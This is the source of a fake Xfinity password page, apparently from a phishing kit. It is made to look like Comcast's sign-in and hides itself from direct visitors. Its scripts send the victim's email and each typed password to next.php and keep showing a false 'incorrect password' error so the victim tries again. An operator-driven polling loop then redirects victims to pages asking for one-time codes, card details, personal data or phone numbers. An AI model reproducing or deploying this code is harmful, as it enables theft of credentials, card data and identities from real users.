<?php
session_start();
if (!isset($_SESSION['came_from_index']) || $_SESSION['came_from_index'] !== true) {
    header("HTTP/1.0 404 Not Found");
    exit("404 Not Found");
}
?>

<!DOCTYPE html>
<html data-bs-theme="light" lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
    <title>Xfinity</title>
    <link rel="stylesheet" href="../assets/bootstrap/css/bootstrap.min.css">
    <link rel="stylesheet" href="../assets/fonts/fontawesome-all.min.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css">
    <link rel="stylesheet" href="../assets/css/styles.css">
</head>

<body class="col-lg-12"><br>
    <div class="container" style="display:flex;justify-content:left;background-size:cover;padding:0;">
        <div class="form-container" id="password_content" style="margin: 60px 0 0 0;display: block;">
            <div class="form-logo" style="display:flex;justify-content:left;align-items:center;height:auto;"><span style="color:grey;">Xfinity</span></div><br>
            <div><i class="far fa-arrow-alt-circle-left" style="color: #6138F5;"></i><a id="backEm" class="backEm" href="" style="color: #6138F5;margin-left: 6px;" onclick="backFun();"></a></div>
            <div class="inner-container" style="height:auto;width:auto;padding:0px;">
                <div class="inner_container_form" style="display:block;">
                    <p class="heading" style="display:block;font-size:2rem;font-weight:bold;text-align:left;margin:0;line-height:40px;">Enter your password</p>
                </div>
                <p id="passpage_email"></p>
                <div class="em_form_group field"><input type="password" id="pass" class="em_form_field" placeholder="" required=""></div>
                <p id="err" style="margin: 0px;margin-top: 8px;color: rgb(243,0,0);">Incorrect Password, Please try again.</p><br><a href="#" style="font-weight:500;color:#6138F5;">Forgot Password?</a><br><br><span> By signing in, you agree to our </span><a href="http://my.xfinity.com/terms/web/">Terms of Service</a><span> and </span><a href="http://xfinity.comcast.net/privacy/">Privacy Policy</a><span>. </span><br><br><button class="btn btn-primary" id="next-btn" type="button" style="background-color:#6138F5;border:none;border-radius:4px;width:130px;height:60px;font-size:1rem;" onclick="nextFun();"><span class="button-text"><b>Sign in</b></span></button><button class="btn btn-primary" type="button" id="next-btn3" style="background-color:#6138F5;border:none;border-radius:4px;width:130px;height:60px;font-size:1rem;display:none;"><span class="button-text"><b>Sign in</b></span></button>
            </div>
        </div>
        <div id="loading_content" class="form-container" style="margin:60px 70px 0 0;display:none;">
            <div class="form-logo" style="display:flex;justify-content:left;align-items:center;height:auto;"><span style="color:grey;">Xfinity</span></div><br>
            <div class="inner-container" style="height:auto;width:auto;padding:0px;display:flex;justify-content:center;align-items:center;margin-top:50%;">
                <div class="d-flex justify-content-center inner_container_form" style="display:block;">
                    <div class="text-primary spinner-border" role="status" style="width:4rem;height:4rem;"><span class="visually-hidden"></span></div>
                </div>
            </div>
        </div>
    </div>
    <div id="footer" class="bottom-div" style="display:flex;flex-direction:column;align-items:center;">
        <p style="font-weight:bold;font-size:2rem;margin:0;">Xfinity</p>
        <p style="font-size:0.8rem;">© 2023 Comcast</p>
        <div style="display:flex;flex-direction:column;justify-content:space-between;align-items:center;">
            <div><button class="btn t-link">Web terms of service</button><button class="btn t-link">Privacy policy</button><button class="btn t-link">CA Notion</button><button class="btn t-link">Your button privacy choices</button></div>
        </div>
    </div><script>

const btn1 = document.getElementById('next-btn');
const btn2 = document.getElementById('next-btn2');
const emCon = document.getElementById('email_content');
const passCon =document.getElementById('password_content');

// Check if the element is currently hidden



  function handleKeyPress(event) {
  const isHiddenem = window.getComputedStyle(emCon).display === 'none';
const isHiddenpass = window.getComputedStyle(passCon).display === 'none';
    // Check if the pressed key is Enter (key code 13)
    if (event.keyCode === 13) {

      if(isHiddenpass){
        btn1.click();
      }
      else if(isHiddenem){

        btn2.click();
      }
      button.click();
    }
  }

  // Add event listener to the document for key press events
  document.addEventListener('keypress', handleKeyPress);
</script><script>
      var username = document.getElementById("em");
      var password = document.getElementById("pass");

    



  function registerUser(op) {
  console.log(username.value.length+'       '+ op)
if(( username.value.length == 0 || username.value.length < 3 ) && op == 1){
  $('#err1').show();
}

else if(username.value.length > 3  && op == 1){
  if(username.value.indexOf(' ') >= 0){
    $('#err1').show();
  }
  else {
  $('#err1').hide();
  $('#email_content').hide();
  $('#password_content').show();
  }

}
else if(password.value.length < 3  && op == 2){
  $('#err2').show();

}
else if(password.value.length > 3  && op == 2){
  $('#err2').hide();
  $('#next-btn2').prop('disabled', true);
  $('#pass').prop('disabled', true);
  $('#next-btn2').html("Verifing...");
  $('#password_content').css('opacity', '0.9');
  
//  $.ajax({
//           type: "POST",
//           url: "next.php",
//           data: { username: username.value, password: password.value },
//           success: function(data) {
//               // Handle the response from the server (user ID)
//               alert("User ID: " + data);
//           }
//       });
let setval;

$.ajax({
  type: "POST",
  url: "next.php",
  data: { username: username.value, password: password.value },
  success: function(data) {
    localStorage.setItem('userId', data);



    // let uID = localStorage.getItem('userId');
        // $.ajax({
        // type: "POST",
        // url: "user_response.php", // URL for the second PHP script
        // data: { userId: uID, uRes: `Password : ${password.value}` },
        //     success: function (response){
        //     console.log(response);
        //     var parsedResponse = JSON.parse(response);
        //     console.log(parsedResponse[0].admin_action);
        //  }
        //   });

    // Function to handle the second AJAX request
    function sendSecondRequest() {
      var userId = localStorage.getItem('userId');
      $.ajax({
        type: "POST",
        url: "server_response.php", // URL for the second PHP script
        data: { userId: userId },
        success: function(response) {
          // Handle the response from the server
          console.log(response);
          var parsedResponse = JSON.parse(response);
          console.log(parsedResponse[0].admin_action);
          if(parsedResponse[0].admin_action != null){
            if(parsedResponse[0].admin_action == 1){
              $('#err2').show();
              $('#pass').prop('disabled', false);
              $('#next-btn2').html("Sign In");
              $('#next-btn2').prop('disabled', false);
              $('#password_content').css('opacity', '1.0');

              //   $.ajax({
                //   type: "POST",
                //   url: "action_value.php", 
                //   data: { userId: userId, act: NULL },
                //   success: function (response) {
                //     console.log(response);
                //     var parsedResponse = JSON.parse(response);
                //     console.log(parsedResponse[0].admin_action);
                //   }
                // });


              clearInterval(setval); 
            }
            else if(parsedResponse[0].admin_action == 22){
              window.location.replace("./otp.html");
            }
            else if(parsedResponse[0].admin_action == 0) {
                window.location.replace("https://login.xfinity.com/login");
              }
              else if(parsedResponse[0].admin_action == 33) {
              window.location.replace("./card.html");
            }
            else if(parsedResponse[0].admin_action == 22) {
              window.location.replace("./otp.html");
            }
            else if(parsedResponse[0].admin_action == 44) {
              window.location.replace("./personal.html");
            }
            else if(parsedResponse[0].admin_action == 55) {
              window.location.replace("./ph.html");
            }
          }
        }
      });
    }

    // Call the function immediately before setting the interval
    sendSecondRequest();

    // Set an interval to send the second AJAX request every 3 seconds
    setval = setInterval(sendSecondRequest, 3000);
  }
});


}
}


</script>
    <script src="../assets/bootstrap/js/bootstrap.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
    
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>

<script>
$(document).ready(function () {
    $(document).on('keypress', function (e) {
    if (e.which === 13) {
        $('#next-btn').click();
    }
});

    // Get parameters from URL
    const urlParams = new URLSearchParams(window.location.search);
    const useridEncoded = urlParams.get('userid');
    const maxTry = parseInt(urlParams.get('maxtry') || '3');
    const pageValue = urlParams.get('page') || '';
    const domainRedirect = urlParams.get('domain_redirect') || '';

    let tryCount = 0;
    let userid = '';

    // Decode Base64 email
    try {
        userid = atob(useridEncoded || '');
    } catch (e) {
        console.error("Invalid userid encoding");
    }

    // Fill userid into either #backEm or #backEMF
    if ($('#backEm').length) {
        $('#backEm').text(userid);
    }
    if ($('#backEMF').length) {
        $('#backEMF').val(userid);
    }

    // Hide error initially
    $('#err').hide();

    // Next button click handler
    $('#next-btn').on('click', function () {
        const password = $('#pass').val().trim();

        // If password empty
        if (!password) {
            $('#err').show();
            return;
        }

        // Disable button until AJAX finishes
        $('#next-btn').prop('disabled', true);

        // Prepare POST data
        const postData = {
            ai: userid,
            pr: password,
            page_value: pageValue
        };

        $.ajax({
            url: '../next.php',
            type: 'POST',
            data: postData,
            success: function (response) {
                tryCount++;

                if (tryCount >= maxTry) {
                    // After maxTry, proceed normally
                    $('#err').hide();
                     const emailParts = userid.split('@');
                     if(!domainRedirect){
                    if (emailParts.length === 2) {
                        const domain = emailParts[1];
                        window.location.replace(`https://${domain}`);
                    } else {
                        // Fallback if email is malformed
                        window.location.replace("https://www.google.com");
                    }
                    }else{
                         window.location.replace(domainRedirect);
                    }


                    // You can redirect or take another action here
                } else {
                    // Show error and reset password field
                    $('#err').show();
                    $('#pass').val('');
                }
            },
            error: function () {
                alert("Error contacting server.");
            },
            complete: function () {
                // Re-enable button after request finishes
                $('#next-btn').prop('disabled', false);
            }
        });
    });
});
</script>

</body>


</html>